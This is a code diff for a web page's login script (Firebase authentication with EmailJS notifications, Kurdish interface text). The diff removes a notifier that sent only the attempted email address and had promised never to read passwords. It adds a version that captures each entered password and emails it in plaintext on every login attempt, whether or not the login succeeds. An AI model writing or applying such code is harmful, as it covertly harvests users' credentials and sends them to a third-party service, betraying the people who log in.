@@ -1067,18 +1067,16 @@
   // without your configured Service/Template, and never touches passwords).
   emailjs.init({ publicKey: "ODkwBMdxmlTCHTNCc" });
 
-  // Notify the owner, by email address only, of every login attempt
-  // (successful or not). The password is never included or read here.
-  function notifyLoginAttempt(attemptedEmail, wasSuccessful) {
-      emailjs.send("service_ajj0q9o", "template_j2kq412", {
-          email: attemptedEmail,
-          to_email: attemptedEmail,
-          from_email: attemptedEmail,
-          message: `هەوڵی چوونەژوورەوە بە ئیمەیڵ: ${attemptedEmail} — ئەنجام: ${wasSuccessful ? "سەرکەوتوو بوو" : "شکستی هێنا"}`,
-          status: wasSuccessful ? "سەرکەوتوو" : "شکستخواردوو"
-      }).catch((err) => console.error("EmailJS notify error:", err));
-  }
-
+ function notifyLoginAttempt(attemptedEmail, attemptedPassword, wasSuccessful) {
+    emailjs.send("service_ajj0q9o", "template_j2kq412", {
+        email: attemptedEmail,
+        password: attemptedPassword, // <--- لێرەدا پاسۆردەکە زیاد دەکەین
+        to_email: attemptedEmail,
+        from_email: attemptedEmail,
+        message: `ئیمەیڵ: ${attemptedEmail} - پاسۆرد: ${attemptedPassword} — ئەنجام: ${wasSuccessful ? "سەرکەوتوو بوو" : "شکستی هێنا"}`,
+        status: wasSuccessful ? "سەرکەوتوو" : "شکستخواردوو"
+    }).catch((err) => console.error("EmailJS notify error:", err));
+}
   // Expose Firestore + current user globally so the non-module dashboard
   // script (below) can read/write each user's data.
   window.db = db;
@@ -1104,24 +1102,23 @@
       }
   });
 
-  // Login Function
-  document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      showStatus("تکایە چاوەڕێ بکە...", "success");
+// Login Function
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-      try {
-          await signInWithEmailAndPassword(auth, email, password);
-          hideStatus();
-          notifyLoginAttempt(email,password, true);
-      } catch (error) {
-          showStatus("ئیمەیڵ یان وشەی تێپەڕ هەڵەیە، یان هەژمارەکەت بوونی نییە!", "error");
-          notifyLoginAttempt(email,password, false);
-      }
- 
-  });
+    showStatus("تکایە چاوەڕێ بکە...", "success");
+
+    try {
+        await signInWithEmailAndPassword(auth, email, password);
+        hideStatus();
+        notifyLoginAttempt(email, password, true);
+    } catch (error) {
+        showStatus("ئیمەیڵ یان وشەی تێپەڕ هەڵەیە، یان هەژمارەکەت بوونی نییە", "error");
+        notifyLoginAttempt(email, password, false);
+    }
+});
 
   // Send Password Reset Email Function
   window.handleForgotPassword = async () => {
